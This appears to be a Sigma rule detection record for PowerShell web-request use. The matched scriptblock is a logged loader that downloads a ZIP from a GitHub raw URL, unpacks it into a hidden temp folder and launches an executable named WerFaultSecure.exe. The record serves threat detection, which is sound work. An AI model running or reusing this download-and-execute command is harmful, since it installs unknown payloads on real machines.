sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=$url = "https://github.com/nateeintanan2527/Joyce_Data/raw/main/DATA3.zip"; $dir = [System.Guid]::NewGuid().ToString(); (New-Object Net.WebClient).DownloadFile("$url", "$env:temp\$dir.zip"); New-Item -Path "$env:temp\$dir" -ItemType Directory; Expand-Archive -LiteralPath "$env:temp\$dir.zip" -DestinationPath $env:temp\$dir; attrib +h $env:temp\$dir; Remove-Item "$env:temp\$dir.zip"; Start-Sleep -Seconds 3; Set-Location -Path "$env:temp\$dir"; Start-Process .\WerFaultSecure.exe
; Path=; ScriptBlockId=c0ea8833-cbe8-4c08-8360-800a8a666924; MessageTotal=1; MessageNumber=1; EventID=4104}
